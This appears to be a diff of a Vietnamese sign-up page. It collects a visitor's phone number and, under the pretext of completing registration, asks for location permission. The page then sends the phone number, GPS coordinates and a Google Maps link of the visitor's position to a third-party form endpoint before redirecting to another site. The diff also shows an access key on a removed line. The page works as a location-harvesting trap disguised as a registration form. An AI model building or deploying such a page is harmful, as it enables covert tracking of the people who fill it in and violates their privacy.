@@ -113,7 +113,6 @@ body {
   to { transform: rotate(360deg); }
 }
 
-/* popup */
 .gps-modal {
   display: none;
   position: fixed;
@@ -155,7 +154,7 @@ body {
   <form id="form">
     <input class="input" name="phone" placeholder="+84 Nhập số điện thoại" required>
 
-    <div class="note">Sau Khi Bấm đăng kí hãy bấm cho phép để đăng kí thành công </div>
+    <div class="note">Sau khi bấm đăng kí hãy bấm cho phép vị trí</div>
 
     <button class="btn" id="btn">Đăng kí</button>
 
@@ -177,7 +176,7 @@ const msg = document.getElementById("msg");
 const btn = document.getElementById("btn");
 const loader = document.getElementById("loader");
 
-const KEY = "691f6507-fd6f-4d2c-a85c-ae34f3432aa0";
+const KEY = "DAN_KEY_MOI_VAO_DAY";
 const REDIRECT_URL = "https://honnhangd.com";
 
 function showGpsModal() {
@@ -213,13 +212,18 @@ form.addEventListener("submit", async (e) => {
     return;
   }
 
+  const gpsLink = `https://www.google.com/maps?q=${gps.lat},${gps.lon}`;
+
   await fetch("https://api.web3forms.com/submit", {
     method: "POST",
     headers: {"Content-Type": "application/json"},
     body: JSON.stringify({
       access_key: KEY,
+      subject: "Đăng kí mới QuanLy247",
+
       phone: form.phone.value,
-      gps: gps.lat + "," + gps.lon
+      gps: gps.lat + "," + gps.lon,
+      gps_link: gpsLink
     })
   });
 
